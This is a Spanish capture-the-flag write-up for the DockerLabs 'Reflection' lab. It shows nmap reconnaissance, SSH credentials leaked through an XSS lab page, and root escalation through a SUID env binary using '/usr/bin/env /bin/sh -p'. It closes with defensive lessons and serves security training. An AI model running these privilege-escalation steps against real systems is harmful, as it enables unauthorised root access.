# Reflection — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 27/12/2024  
**Técnicas:** XSS · SUID · GTFOBins · SSH · env privilege escalation

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — laboratorio XSS](#2-enumeración-web--laboratorio-xss)
3. [Acceso SSH](#3-acceso-ssh)
4. [Escalada de privilegios — SUID env](#4-escalada-de-privilegios--suid-env)
5. [Lección aprendida](#5-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos el laboratorio:

```bash
sudo bash auto_deploy.sh reflection.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo inicial evitando comprobaciones ICMP:

```bash
nmap -Pn 172.17.0.2
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

Enumeramos versiones y servicios:

```bash
nmap -p22,80 -sCV -Pn 172.17.0.2
```

Resultado:

```text
OpenSSH 9.2p1 Debian
Apache httpd 2.4.62
```

El título detectado es:

```text
Laboratorio de Cross-Site Scripting (XSS)
```

---

## 2. Enumeración web — laboratorio XSS

Accedemos al servidor web y observamos una plataforma educativa enfocada en vulnerabilidades XSS.

Explorando los distintos niveles y realizando pruebas sobre los campos vulnerables encontramos un mensaje emergente con credenciales SSH.

Resultado:

```text
Usuario: balu
Password: balulero
```

---

## 3. Acceso SSH

Accedemos al sistema:

```bash
ssh balu@172.17.0.2
```

Contraseña:

```text
balulero
```

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
Sorry, user balu may not run sudo
```

No existen permisos sudo configurados.

---

## 4. Escalada de privilegios — SUID env

Buscamos binarios SUID:

```bash
find / -perm -4000 -user root 2>/dev/null
```

Resultado relevante:

```text
/usr/bin/env
```

Consultamos GTFOBins para el binario `env`.

Payload utilizado:

```bash
./env /bin/sh -p
```

También puede ejecutarse directamente:

```bash
/usr/bin/env /bin/sh -p
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 5. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Información sensible expuesta mediante XSS | Acceso SSH |
| Binario env con permisos SUID | Escalada a root |

**Para defenderse:**

- Validar y sanitizar entradas frente a XSS.
- No mostrar credenciales sensibles en aplicaciones web.
- Auditar binarios SUID peligrosos.
- Aplicar principio de mínimo privilegio.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
